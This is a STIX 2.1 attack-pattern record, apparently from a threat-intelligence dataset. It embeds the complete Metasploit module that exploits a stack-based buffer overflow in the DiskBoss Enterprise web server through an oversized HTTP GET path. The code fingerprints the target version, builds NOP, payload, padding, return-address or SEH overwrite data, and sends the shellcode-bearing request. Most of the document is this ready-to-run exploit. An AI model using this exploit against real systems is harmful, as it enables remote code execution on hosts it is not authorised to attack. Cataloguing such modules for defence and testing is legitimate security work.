{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c6c3e235-b68f-4d5f-8972-7bedfdc6bb0c",
    "created": "2024-08-14T16:52:59.940846Z",
    "modified": "2024-08-14T16:52:59.94085Z",
    "name": "DiskBoss Enterprise GET Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow vulnerability in the web interface of DiskBoss Enterprise v7.5.12, v7.4.28, and v8.2.14 caused by improper bounds checking of the request path in HTTP GET requests sent to the built-in web server. This module has been tested successfully on Windows XP SP3 and Windows 7 SP1.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/diskboss_get_bof.rb",
            "external_id": "diskboss_get_bof.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Seh\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'DiskBoss Enterprise GET Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow vulnerability\n        in the web interface of DiskBoss Enterprise v7.5.12, v7.4.28, and v8.2.14,\n        caused by improper bounds checking of the request path in HTTP GET\n        requests sent to the built-in web server. This module has been\n        tested successfully on Windows XP SP3 and Windows 7 SP1.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'vportal',        # Vulnerability discovery and PoC\n          'Ahmad Mahfouz',  # Vulnerability discovery and PoC\n          'Gabor Seljan',   # Metasploit module\n          'Jacob Robles'    # Metasploit module\n        ],\n      'References'     =>\n        [\n          ['EDB', '40869'],\n          ['EDB', '42395']\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Platform'       => 'win',\n      'Payload'        =>\n        {\n          'BadChars'   => \"\\x00\\x09\\x0a\\x0d\\x20\",\n          'Space'      => 2000\n        },\n      'Targets'        =>\n        [\n          [\n            'Automatic Targeting',\n            {\n              'auto' => true\n            }\n          ],\n          [\n            'DiskBoss Enterprise v7.4.28',\n            {\n              'Offset' => 2471,\n              'Ret'    => 0x1004605c  # ADD ESP,0x68 # RETN [libpal.dll]\n            }\n          ],\n          [\n            'DiskBoss Enterprise v7.5.12',\n            {\n              'Offset' => 2471,\n              'Ret'    => 0x100461da  # ADD ESP,0x68 # RETN [libpal.dll]\n            }\n          ],\n          [\n            'DiskBoss Enterprise v8.2.14',\n            {\n              'Offset' => 2496,\n              'Ret'    => 0x1002A8CA  # SEH : # POP EDI # POP ESI # RET 04 [libpal.dll]\n            }\n          ]\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2016-12-05',\n      'DefaultTarget'  => 0))\n  end\n\n  def check\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri'    => '/'\n    )\n\n    if res && res.code == 200\n      if res.body =~ /DiskBoss Enterprise v(7\\.4\\.28|7\\.5\\.12|8\\.2\\.14)/\n        return Exploit::CheckCode::Vulnerable\n      elsif res.body =~ /DiskBoss Enterprise/\n        return Exploit::CheckCode::Detected\n      end\n    else\n      vprint_error('Unable to determine due to a HTTP connection timeout')\n      return Exploit::CheckCode::Unknown\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    mytarget = target\n\n    if target['auto']\n      mytarget = nil\n\n      print_status('Automatically detecting the target...')\n\n      res = send_request_cgi(\n        'method' => 'GET',\n        'uri'    => '/'\n      )\n\n      if res && res.code == 200\n        if res.body =~ /DiskBoss Enterprise v7\\.4\\.28/\n          mytarget = targets[1]\n        elsif res.body =~ /DiskBoss Enterprise v7\\.5\\.12/\n          mytarget = targets[2]\n        elsif res.body =~ /DiskBoss Enterprise v8\\.2\\.14/\n          mytarget = targets[3]\n        end\n      end\n\n      if !mytarget\n        fail_with(Failure::NoTarget, 'No matching target')\n      end\n\n      print_status(\"Selected Target: #{mytarget.name}\")\n    end\n\n    case mytarget\n    when targets[1], targets[2]\n      sploit =  make_nops(21)\n      sploit << payload.encoded\n      sploit << rand_text_alpha(mytarget['Offset'] - payload.encoded.length)\n      sploit << [mytarget.ret].pack('V')\n      sploit << rand_text_alpha(2500)\n    when targets[3]\n      seh = generate_seh_record(mytarget.ret)\n      sploit = payload.encoded\n      sploit << rand_text_alpha(mytarget['Offset'] - payload.encoded.length)\n      sploit[sploit.length, seh.length] = seh\n      sploit <<  make_nops(10)\n      sploit << Rex::Arch::X86.jmp(0xffffbf25)   # JMP to ShellCode\n      sploit << rand_text_alpha(5000 - sploit.length)\n    else\n      fail_with(Failure::NoTarget, 'No matching target')\n    end\n\n    send_request_cgi(\n      'method' => 'GET',\n      'uri'    => sploit\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-12-05",
    "x_mitre_platforms": [
        "win'"
    ]
}